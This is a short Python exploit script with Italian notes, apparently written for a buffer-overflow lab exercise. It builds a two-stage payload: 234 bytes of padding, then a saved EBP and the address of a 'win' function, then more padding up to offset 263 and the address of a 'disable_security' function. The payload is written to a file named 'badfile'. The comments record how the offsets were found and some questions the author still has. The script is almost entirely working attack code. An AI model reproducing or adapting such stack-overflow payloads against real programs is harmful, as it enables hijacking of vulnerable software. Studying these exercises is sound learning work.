#note

import os
import struct

#devo fare due overflow: il primo sul buffer nel main e il secondo su print_function (penso)

win = 0x8048539
disable_security = 0x804850b

#payload = payload1 (print_function_bof_payload) + payload2 (fp_bof_payload)

#payload1 e` per l'overflow dentro print_address !!
#payload1 = A*dst_len + win_addr
EBP = 0xbffff248

payload1 = "A"*234 #[ebp-0xea] dove 0xea=234 quando si fa pdisass print_function si vede prima della strcpy quando viene pushato il buffer negli input della funzione
payload1 += struct.pack("I", EBP) #perche` va aggiunto l'EBP??
payload1 += struct.pack("I", win)

#payload2 e` per riuscire a chiamare print_function grazie ad fp quindi con l'overflow su str
#payload2 = A*(str_len - len(payload1)) + disable_security_check_addr

#perche` 263? su peda ho fatto overflow con 280 e tramite pattern search ho visto che EIP+0 e` a 263 --> riesco a entrare in print_function 
padding = 263 - len(payload1) #questo 263 era anche 0x113-0xc in esadecimale (275-12)

payload2 = "A"*padding
payload2 += struct.pack("I", disable_security)

payload = payload1
payload += payload2

f = open("badfile", "a")
f.write("%s" % payload)
f.close()
